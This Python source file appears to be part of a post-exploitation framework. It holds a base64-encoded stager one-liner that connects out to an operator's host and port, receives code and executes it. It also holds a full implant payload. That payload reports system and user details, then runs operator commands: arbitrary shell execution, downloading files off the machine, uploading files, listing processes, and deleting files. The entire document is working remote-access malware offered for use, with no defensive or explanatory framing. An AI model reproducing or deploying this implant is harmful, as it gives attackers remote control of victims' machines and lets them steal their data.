import base64

STAGER_TEMPLATE = '''import socket,struct
s=socket.socket()
s.connect(("{lhost}",{lport}))
h=s.recv(4)
n=struct.unpack("!I",h)[0]
d=b""
while len(d)<n:
    c=s.recv(n-len(d))
    if not c:
        break
    d+=c
s.settimeout(None)
exec(d.decode(),{{"SOCKET":s,"__name__":"__agent__"}})
'''


def build_stager(lhost, lport, python_cmd="python3"):
    script = STAGER_TEMPLATE.format(lhost=lhost, lport=lport)
    b64 = base64.b64encode(script.encode()).decode()
    return "echo '" + b64 + "' | base64 -d | " + python_cmd + " -u - 2>&1"


AGENT_CODE = r'''
import base64
import json
import os
import platform
import socket
import struct
import subprocess
import sys
import traceback

CMD_TIMEOUT = 25


def _recv_exact(n):
    data = b""
    while len(data) < n:
        chunk = SOCKET.recv(n - len(data))
        if not chunk:
            raise ConnectionError("closed")
        data += chunk
    return data


def recv_msg():
    h = _recv_exact(4)
    n = struct.unpack("!I", h)[0]
    return json.loads(_recv_exact(n).decode())


def send_msg(obj):
    data = json.dumps(obj).encode()
    SOCKET.sendall(struct.pack("!I", len(data)) + data)


def _sysinfo():
    try:
        user = os.environ.get("USER") or os.environ.get("USERNAME") or "?"
    except Exception:
        user = "?"
    try:
        cwd = os.getcwd()
    except Exception:
        cwd = "?"
    uid = -1
    gid = -1
    if hasattr(os, "getuid"):
        try:
            uid = os.getuid()
            gid = os.getgid()
        except Exception:
            pass
    hostname = "?"
    if hasattr(os, "uname"):
        try:
            hostname = os.uname().nodename
        except Exception:
            pass
    return {
        "hostname": hostname,
        "os": platform.system(),
        "release": platform.release(),
        "machine": platform.machine(),
        "python": platform.python_version(),
        "user": user,
        "cwd": cwd,
        "uid": uid,
        "gid": gid,
    }


def _exec(cmd):
    try:
        p = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=CMD_TIMEOUT
        )
        return {
            "ok": True,
            "stdout": p.stdout.decode(errors="replace"),
            "stderr": p.stderr.decode(errors="replace"),
            "rc": p.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "timeout"}
    except Exception as e:
        return {"ok": False, "error": type(e).__name__ + ": " + str(e)}


def _cd(path):
    try:
        os.chdir(path or ".")
        return {"ok": True, "cwd": os.getcwd()}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _pwd():
    try:
        return {"ok": True, "cwd": os.getcwd()}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _ls(path):
    try:
        path = path or "."
        out = []
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            try:
                st = os.stat(full)
                out.append({
                    "name": name,
                    "type": "dir" if os.path.isdir(full) else "file",
                    "size": st.st_size,
                    "mtime": int(st.st_mtime),
                })
            except OSError:
                out.append({
                    "name": name, "type": "?", "size": 0, "mtime": 0
                })
        return {"ok": True, "entries": out, "cwd": os.getcwd()}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _download(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        return {
            "ok": True,
            "data": base64.b64encode(data).decode(),
            "path": path,
            "size": len(data),
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _upload(path, b64):
    try:
        data = base64.b64decode(b64)
        with open(path, "wb") as f:
            f.write(data)
        return {"ok": True, "path": path, "size": len(data)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _getuid():
    uid = -1
    gid = -1
    if hasattr(os, "getuid"):
        try:
            uid = os.getuid()
            gid = os.getgid()
        except Exception:
            pass
    return {"ok": True, "uid": uid, "gid": gid}


def _ps():
    try:
        p = subprocess.run(
            ["ps", "aux"], capture_output=True, timeout=10
        )
        return {
            "ok": True,
            "stdout": p.stdout.decode(errors="replace"),
            "stderr": p.stderr.decode(errors="replace"),
        }
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "timeout"}
    except Exception:
        try:
            p = subprocess.run(
                ["ps", "-ef"], capture_output=True, timeout=10
            )
            return {
                "ok": True,
                "stdout": p.stdout.decode(errors="replace"),
                "stderr": p.stderr.decode(errors="replace"),
            }
        except Exception as e:
            return {"ok": False, "error": str(e)}


def _mkdir(path):
    try:
        os.makedirs(path, exist_ok=True)
        return {"ok": True, "path": path}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _rm(path):
    try:
        if os.path.isdir(path) and not os.path.islink(path):
            os.rmdir(path)
        else:
            os.remove(path)
        return {"ok": True, "path": path}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _fatal(msg):
    try:
        sys.stderr.write("[agent fatal] " + msg + "\n")
        sys.stderr.flush()
    except Exception:
        pass


try:
    hello = {"type": "hello", "sysinfo": _sysinfo()}
    send_msg(hello)
except Exception:
    _fatal("hello send failed")
    traceback.print_exc()
    raise SystemExit(1)

while True:
    try:
        msg = recv_msg()
    except Exception:
        break
    cmd = msg.get("cmd", "")
    args = msg.get("args", [])
    try:
        if cmd == "exec":
            resp = _exec(args[0] if args else "")
        elif cmd == "cd":
            resp = _cd(args[0] if args else ".")
        elif cmd == "pwd":
            resp = _pwd()
        elif cmd == "ls":
            resp = _ls(args[0] if args else ".")
        elif cmd == "download":
            resp = _download(args[0] if args else "")
        elif cmd == "upload":
            resp = _upload(args[0] if args else "", msg.get("data", ""))
        elif cmd == "getuid":
            resp = _getuid()
        elif cmd == "sysinfo":
            resp = {"ok": True, "sysinfo": _sysinfo()}
        elif cmd == "ps":
            resp = _ps()
        elif cmd == "mkdir":
            resp = _mkdir(args[0] if args else "")
        elif cmd == "rm":
            resp = _rm(args[0] if args else "")
        elif cmd == "exit":
            send_msg({"ok": True, "bye": True})
            break
        else:
            resp = {"ok": False, "error": "unknown: " + cmd}
    except Exception:
        _fatal("cmd " + cmd + " crashed")
        traceback.print_exc()
        resp = {"ok": False, "error": "agent internal error"}
    try:
        send_msg(resp)
    except Exception:
        _fatal("response send failed")
        traceback.print_exc()
        break

try:
    SOCKET.close()
except Exception:
    pass
'''
